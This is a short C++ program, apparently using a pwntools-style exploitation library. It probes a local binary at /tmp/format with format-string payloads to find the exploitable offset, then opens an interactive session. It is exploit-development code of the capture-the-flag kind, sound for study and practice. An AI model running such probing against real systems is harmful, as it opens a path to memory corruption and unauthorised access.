#include <pwntools>
#include <iostream>
using namespace pwn;

int main(void) {
    Process p("/tmp/format");
    fmtstr_payload f;
    int64_t offset = f.find_offset(
        [&](const std::string &payload) -> std::string {
            p.sendline(payload);
            return p.recvline();
        }
    );

    if(offset != -1)
        log::success("Format string offset found at: "+std::to_string(offset));
    p.interactive();
}
